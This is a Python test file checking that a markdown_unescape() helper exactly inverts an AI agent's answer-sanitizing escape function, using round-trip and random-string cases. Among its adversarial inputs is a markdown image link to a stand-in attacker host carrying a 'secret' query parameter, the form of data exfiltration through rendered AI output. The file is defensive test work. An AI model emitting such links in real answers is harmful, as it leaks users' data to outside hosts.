# backend/tests/test_text_escaping.py
# Step 4.4: app/text_escaping.py's own markdown_unescape() -- the shared
# helper built once per the Phase 4 kickoff decision #13 (4.4's own
# escalation email, 6.4's future dashboard inbox). Proven here as the
# EXACT inverse of app.agent.graph._sanitize_answer_text()'s own escape
# table, against real output from that real function -- not a
# hand-matched guess at its six characters.
import random

from app.agent.graph import _sanitize_answer_text
from app.text_escaping import markdown_unescape


def test_round_trips_every_individual_escaped_character():
    for char in "\\![]<>":
        original = f"before {char} after"
        assert markdown_unescape(_sanitize_answer_text(original)) == original


def test_round_trips_adversarial_strings_including_runs_of_backslashes():
    # The identical adversarial strings tests/test_agent_graph_citations.
    # py's own test_escape_is_split_invariant_under_random_concatenation
    # uses -- this is the same escape table's inverse, so the same
    # adversarial shapes (runs of backslashes, every escaped character
    # back to back) are the real stress cases here too.
    adversarial_strings = [
        "![" + "a" * 250 + "](https://attacker.example/x?q=secret)",
        "[click][r] and elsewhere [r]: https://attacker.example",
        "\\[\\]\\!\\<\\>\\\\" * 10,
        "!" * 50 + "[" * 50 + "]" * 50 + "<" * 50 + ">" * 50 + "\\" * 50,
        "a literal backslash \\ followed by text",
        "",
    ]
    for original in adversarial_strings:
        escaped = _sanitize_answer_text(original)
        assert markdown_unescape(escaped) == original


def test_round_trips_random_strings_over_a_fixed_seed():
    rng = random.Random(20261015)  # noqa: S311 (test data generation, not crypto)
    alphabet = "ab12 \\![]<>`*_"
    for _ in range(200):
        length = rng.randint(0, 40)
        original = "".join(rng.choice(alphabet) for _ in range(length))
        escaped = _sanitize_answer_text(original)
        assert markdown_unescape(escaped) == original


def test_unescape_is_a_no_op_on_text_with_nothing_to_unescape():
    # Visitor-typed text was never escaped in the first place (see this
    # module's own docstring) -- a plain string with no backslash-pair
    # shapes at all passes through unchanged.
    text = "hello, is anyone there? I need help with my order"
    assert markdown_unescape(text) == text


def test_unescape_only_touches_the_six_escaped_pairs_never_a_lone_backslash():
    # A lone backslash NOT immediately followed by one of the six
    # escaped characters is left alone -- this function's contract is
    # "invert _sanitize_answer_text()'s own output", not "strip every
    # backslash".
    text = r"C:\Users\test and 50% \o/ done"
    assert markdown_unescape(text) == text
